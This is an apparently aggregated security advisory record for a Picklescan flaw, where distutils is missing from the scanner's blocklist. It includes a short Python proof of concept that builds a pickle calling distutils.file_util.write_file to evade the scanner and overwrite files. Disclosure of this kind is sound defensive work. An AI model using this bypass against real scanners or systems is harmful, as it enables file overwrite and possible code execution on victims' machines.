vulnerability_id: VCID-f2zc-ca67-4yfv
aliases:
  - GHSA-m273-6v24-x4m4
summary: "Picklescan vulnerable to Arbitrary File Writing\n### Summary\nPicklescan has got open()\
  \ and shutil in its default dangerous blocklist to prevent arbitrary file overwrites. However\
  \ the module distutils isnt blocked and can be used for the same purpose ie to write arbitrary\
  \ files.\n\n### Details\nThis is another vulnerability which impacts the downstream user.\n\
  \nBy constructing a pickle that user distutils.file_util.write_file, an attacker can overwrite\
  \ critical system files (like .ssh/authorized_keys, web server configurations, or source code)\
  \ to achieve DoS or escalate to RCE.\n\n### PoC\n```python\nimport pickle\nimport distutils.file_util\n\
  \nclass FileWriteBypass:\n    def __reduce__(self):\n        \n        target_file = \"pwned_config.env\"\
  \n        content = [\"print('I have overwritten your config')\"]\n        \n        return\
  \ (distutils.file_util.write_file, (target_file, content))\n\npayload = pickle.dumps(FileWriteBypass())\n\
  with open(\"bypass_filewrite.pkl\", \"wb\") as f:\n    f.write(payload)\n\nprint(\"bypass_filewrite.pkl\"\
  )\n```\n\n<img width=\"853\" height=\"197\" alt=\"image\" src=\"https://github.com/user-attachments/assets/a129f5aa-a050-4e88-adb7-5a6f93e35b65\"\
  \ />\n\nTo fix this just add disutil to the blacklist"
severities:
  - score: HIGH
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/advisories/GHSA-m273-6v24-x4m4
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/mmaitre314/picklescan
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/mmaitre314/picklescan/commit/70c1c6c31beb6baaf52c8db1b6c3c0e84a6f9dab
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/mmaitre314/picklescan/pull/53
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/mmaitre314/picklescan/releases/tag/v0.0.33
  - score: HIGH
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/mmaitre314/picklescan/security/advisories/GHSA-m273-6v24-x4m4
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/mmaitre314/picklescan/security/advisories/GHSA-m273-6v24-x4m4
weaknesses:
  - CWE-552
  - CWE-502
references:
  - url: https://github.com/mmaitre314/picklescan
    reference_type:
    reference_id:
  - url: https://github.com/mmaitre314/picklescan/commit/70c1c6c31beb6baaf52c8db1b6c3c0e84a6f9dab
    reference_type:
    reference_id:
  - url: https://github.com/mmaitre314/picklescan/pull/53
    reference_type:
    reference_id:
  - url: https://github.com/mmaitre314/picklescan/releases/tag/v0.0.33
    reference_type:
    reference_id:
  - url: https://github.com/mmaitre314/picklescan/security/advisories/GHSA-m273-6v24-x4m4
    reference_type:
    reference_id:
  - url: https://github.com/advisories/GHSA-m273-6v24-x4m4
    reference_type:
    reference_id: GHSA-m273-6v24-x4m4
